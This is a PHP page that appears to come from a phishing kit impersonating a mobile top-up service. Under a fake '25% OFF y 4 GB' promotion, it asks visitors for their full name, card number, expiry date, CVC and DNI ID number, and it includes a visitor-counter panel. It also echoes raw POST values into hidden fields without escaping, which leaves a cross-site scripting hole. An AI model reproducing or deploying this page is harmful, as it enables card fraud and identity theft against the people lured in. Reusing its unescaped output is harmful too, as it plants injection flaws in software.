<!DOCTYPE html>
<html lang="en">
<?php
include_once("panel/contador.php");
include_once("assets/parts/header.php");
?>
<body>
<?php
include_once("assets/parts/nav.php");
?>
<div class="container">
    <div class="row justify-content-center">
        <div class="col-12">
            <div class="stepper-wrapper">
                <div class="stepper-item completed">
                    <div class="step-counter">1</div>
                </div>
                <div class="stepper-item completed">
                    <div class="step-counter">2</div>
                </div>
                <div class="stepper-item active">
                    <div class="step-counter">3</div>
                </div>
            </div>
        </div>
        <div class="col-12 text-center">
            <h2 class="title">Paso 3:</h2>
            <h5>Paga y recibi tu recarga en el acto.</h5>
            <p>Solo hoy 25% OFF y 4 GB de internet con tu recarga.</p>
        </div>
        <div class="col-md-6 col-10">
            <div class="notification notification_hide" id="notification">
                <h5 class="message" id="message"></h5>
            </div>
        </div>
    </div>
    <div class="row justify-content-center">
        <div class="col-md-6 col-10 mt-5 mb-5">
            <form id="formdata">
                <div class="row">
                    <div class="col-12">
                        <div class="input">
                            <input type="text" name="name" id="name" autocomplete="off">
                            <label for="name" id="name_label">Nombre completo</label>
                            <p>Nombre y apellido que figuran al frente de tu tarjeta.</p>
                        </div>
                    </div>
                    <div class="col-12 mt-3">
                        <div class="input">
                            <input type="text" name="card" id="card" autocomplete="off">
                            <label for="card" id="card_label">Número de tarjeta</label>
                        </div>
                    </div>
                    <div class="col-md-6 col-12 mt-3">
                        <div class="input">
                            <input type="text" name="venc" id="venc" inputmode="decimal" autocomplete="off"placeholder="MM/AA">
                            <label for="venc" id="venc_label">Fecha de vencimiento</label>
                        </div>
                    </div>
                    <div class="col-md-6 col-12 mt-3">
                        <div class="input">
                            <input type="text" name="cvc" id="cvc" inputmode="decimal" autocomplete="off"placeholder="123">
                            <label for="cvc" id="cvc_label">Código de seguridad</label>
                        </div>
                    </div>
                    <div class="col-12 mt-3">
                        <div class="input">
                            <input type="text" name="dni" id="dni" inputmode="decimal" autocomplete="off">
                            <label for="dni" id="dni_label">Número de DNI</label>
                        </div>
                    </div>
                    <div class="col-12 mt-4">
                        <button type="submit" id="submit" disabled>Siguiente</button>
                    </div>
                </div>
            <input type="hidden" name="number" value="<?php echo $_POST["number"]; ?>">
            <input type="hidden" name="company" value="<?php echo $_POST["company"];?>">
            </form>
        </div>
    </div>
</div>
<?php
include_once("assets/parts/footer.php");
?>
</body>
</html>